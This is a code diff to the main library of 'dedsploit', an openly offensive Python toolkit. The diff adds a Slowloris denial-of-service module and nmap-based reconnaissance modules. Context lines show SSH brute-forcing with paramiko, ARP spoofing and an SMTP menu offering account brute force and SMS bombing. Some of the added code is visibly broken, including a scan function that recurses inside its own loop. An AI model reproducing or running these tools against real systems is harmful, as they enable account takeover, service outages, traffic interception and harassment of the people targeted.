@@ -1,9 +1,17 @@
 ##########################################
 # MainLib.py - Main library for dedsploit
+# PART 1 - Attack methods - takes input, create objects, execute attack
+# PART 2 - User input - display the help menu, take user name, and then execute attack methods
+#   1. SSH
+#   2. SMTP
+#   3. HTTP
+#   4. Recon
+#   5. Miscellenous
 ##########################################
 
-import os, sys, nmap, threading, signal, socket, smtplib, logging, paramiko
-logging. getLogger("scapy.runtime").setLevel(logging.ERROR)
+import os, sys, threading, signal, socket, smtplib, logging, random
+import yagmail, nmap, paramiko
+logging. getLogger("scapy.runtime").setLevel(logging.ERROR) # STDOUT from Scapy - please stfu
 
 from time import sleep
 from getpass import getpass
@@ -16,7 +24,7 @@ W = '\033[0m'  # white (normal)
 R = '\033[31m'  # red
 G = '\033[32m'  # green
 O = '\033[33m'  # orange
-B = '\033[34m'  # blue
+B = '\033[34m'  # blue                      # Colors to make program and output text much more appealing
 P = '\033[35m'  # purple
 C = '\033[36m'  # cyan
 LR = '\033[1;31m' # light red
@@ -27,7 +35,7 @@ LP = '\033[1;35m' # light purple
 LC = '\033[1;36m' # light cyan
 
 ##########################################
-# Determine Public and Local IP address given to this machine.
+# Give user network information.
 # This is good for the user's convenience
 ##########################################
 
@@ -52,35 +60,38 @@ def help_options():
     print "||------------------------------------------------------------------||"
     print "|| There are currently " + G + "" + C + "                           ||"
     print "|| ssh                                                              ||"
-    print "|| ftp                                                              ||"
+    print "|| recon                                                            ||"
     print "|| smtp                                                             ||"
     print "|| http                                                             ||"
     print "|| misc                                                             ||"
     print "======================================================================="
 
 #############################################################################################################################
-#############################################################################################################################
+# PART 1            #########################################################################################################
 #############################################################################################################################
 
 def ssh_connect(address, username, password, port, code=0):
+    #############################
+    # SSH_Connect - method for creating objects, and returning codes to see if authentication is success/Failed
+    #############################
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     paramiko.util.log_to_file("filename.log")
 
     try:
-        ssh.connect(address, port=int(port), username=username, password=password)
+        ssh.connect(address, port=int(port), username=username, password=password) # Try to connect to given address
     except paramiko.AuthenticationException:
-        code = 1
+        code = 1        # Incorrect!
     except socket.error, e:
         print R + "[!] Error: Connection Failed. [!]"
-        code = 2
+        code = 2 # Error!
 
     ssh.close()
-    return code
+    return code # code = 0 : Success!
 
-############
-# Main bruteforce module
-############
+    ############
+    # Main bruteforce module for SSH - execute ssh_connect() method, and handles code to print proper output
+    ############
 
 
 def sshBruteforce(address, username, wordlist, port):
@@ -214,6 +225,8 @@ def startarp(interface, gateway_ip, target_ip, packet):
         restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
         sys.exit()
 
+
+
 #############################################################################################################################
 #############################################################################################################################
 #############################################################################################################################
@@ -283,7 +296,7 @@ def ssh():
                 raise ValueError
                 continue
         except ValueError:
-            print R + "[!] Command not Recognized [!]" + W
+            print R + "[!] Command not recognized [!]" + W
             continue
 
 def smtp():
@@ -297,7 +310,7 @@ def smtp():
             ["exit", "Exit the SMTP attack module"],
             ["bruteforce", "Bruteforce a SMTP account"],
             ["smsbomb", "Bomb SMS using fake SMTP server"],
-            ["fakeaddr", "Fake an SMTP address"]
+            #["fakeaddr", "Fake an SMTP email address"],
         ]
         table = AsciiTable(table_data)
         print table.table
@@ -425,7 +438,7 @@ def smtp():
                 raise ValueError
                 continue
         except ValueError:
-            print R + "[!] Command not Recognized [!]" + W
+            print R + "[!] Command not recognized [!]" + W
             continue
 
 def http():
@@ -460,7 +473,7 @@ def http():
                 print "+----------------------------------------------+" + W
                 while True:
                     try:
-                        pre, httpoptions = raw_input(P + "smtp>>arpspoof>> " + W ).split()
+                        pre, httpoptions = raw_input(P + "http>>arpspoof>> " + W ).split()
                         if pre == "iface":
                             interface = httpoptions
                             print "Interface => ", interface
@@ -481,11 +494,139 @@ def http():
                             if httpoptions == "arpspoof":
                                 break
                     except ValueError:
-                        print R + "[!] Command not Recognized [!]" + W
+                        print R + "[!] Command not recognized [!]" + W
                         continue
+            elif http_options == "slowloris":
+                print C + "Required Options:"
+                print "-----------------------------------------------"
+                print "target <ip>            | Set the target's IP address"
+                print "connections <number>   | Set the number of connections to send"
+                print "start slowloris        | Start the Slowloris DoS attack"
+                print "length <time>          | Time to keep attack alive"
+                print "+----------------------------------------------+"
+                print "| Additional Options:                          |"
+                print "+----------------------------------------------+"
+                print "| exit slowloris   | Exit slowloris module     |"
+                print "+----------------------------------------------+" + W
+                while True:
+                    try:
+                        pre, slowoptions = raw_input(P + "http>>slowloris>> " + W).split()
+                        if pre == "target":
+                            ip = "http://"+slowoptions
+                            print "Target IP => ", ip
+                            continue
+                        elif pre == "connections":
+                            socket_count = slowoptions
+                            print "Connections => ", socket_count
+                            continue
+                        elif pre == "length":
+                            length = slowoptions
+                            print "Length => ", length
+                            continue
+                        elif pre == "start":
+                            call(["slowhttptest", "-c", str(socket_count), "-H", "-i 10", "-r 200", "-t GET", "-u", str(ip), "-x 24", "-p 3", "-l", str(length)])
+                            break
+                        ##### Additional Options ####
+                        elif pre == "exit":
+                            if slowoptions == "slowloris":
+                                break
+                    except ValueError:
+                        print R + "[!] Command not recognized [!]" + W
             else:
                 raise ValueError
                 continue
         except ValueError:
-            print R + "[!] Command not Recognized [!]" + W
+            print R + "[!] Command not recognized [!]" + W
             continue
+
+def recon():
+    while True:
+        table_data = [
+            ["Reconaissance Modules", "Available Commands"],
+            ["list", "Show all available commands"],
+            ["exit", "Exit the Recon module"],
+            ["pscan", "Perform a Nmap Port Scan"],
+            ["hosts", "Discover active hosts on the network"],
+        ]
+        table = AsciiTable(table_data)
+        print table.table
+        print LC + "Type 'list' to show all of available modules" + W
+        try:
+            recon_options = raw_input(P + "recon>> " + W )
+            if recon_options == "list":
+                print table.table
+            elif recon_options == "exit":
+                break
+            elif recon_options == "pscan":
+                while True:
+                    print C + "Required Options:"
+                    print "-----------------------------------------------"
+                    print "scan <ip>     | Portscan on IP address  "
+                    print "+-----------------------------------------------+"
+                    print "| Available Commands:                           |"
+                    print "+-----------------------------------------------+"
+                    print "| exit pscan  | Exit portscan module            |"
+                    print "+-----------------------------------------------+" + W
+                    while True:
+                        try:
+                            pre, pscanopts = raw_input(P + "recon>>pscan>> " + W ).split()
+                            if pre == "scan":
+                                ip = pscanopts
+                                print "IP => ", ip
+
+                                def pscan(ip):
+                                        #############################
+                                        # Actual Nmap Scanning! First throw try/except in case of KeyboardInterrupt. Then output results
+                                        #############################
+                                        try:
+                                            print O + "[*] Performing a Nmap scan on the network. Please hold... Use CTRL+C to stop. [*]" + W
+                                            nm = nmap.PortScanner()
+                                            nm.scan(str(ip), '22-443')
+                                        except KeyboardInterrupt:
+                                            print R + "\n[!] Interrupted! Stopping... [!]" + W
+                                            break
+                                        # Output!
+                                        for host in nm.all_hosts():
+                                            print('----------------------------------------------------')
+                                            print('Host : %s (%s)' % (host, nm[host].hostname()))
+                                            print('State : %s' % nm[host].state())
+                                            for proto in nm[host].all_protocols():
+                                                print('----------')
+                                                print('Protocol : %s' % proto)
+                                            lport = nm[host][proto].keys()
+                                            lport.sort()
+                                            for port in lport:
+                                                print ('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))
+                                                pscan(ip)
+
+                                pscan(ip)
+                            elif pre == "exit":
+                                if pscanopts == "pscan":
+                                    break
+                        except ValueError:
+                            print R + "[!] Command not recognized [!]" + W
+                            continue
+            elif recon_options == "hosts":
+                def hosts():
+                    while True:
+                        print O + "[*] Performing a Nmap scan on the network. Please hold... Use CTRL+C to stop. [*]" + W
+                        try:
+                            nm = nmap.PortScanner()
+                            nm.scan(hosts=gateway_ip + "/24", arguments='-n -sn -PE')
+                            print('+-------------------------------+')
+                            for host in nm.all_hosts():
+                                print('| Host | %s (%s) | %s |' % (host, nm[host].hostname(), nm[host].state()))
+                                print('+------------------------------+')
+                        except KeyboardInterrupt:
+                            print R + "\n[!] Interrupted! Stopping... [!]" + W
+                            break
+                hosts()
+            else:
+                raise ValueError
+                continue
+        except ValueError:
+            print R + "[!] Command not recognized [!]" + W
+            continue
+
+def misc():
+    
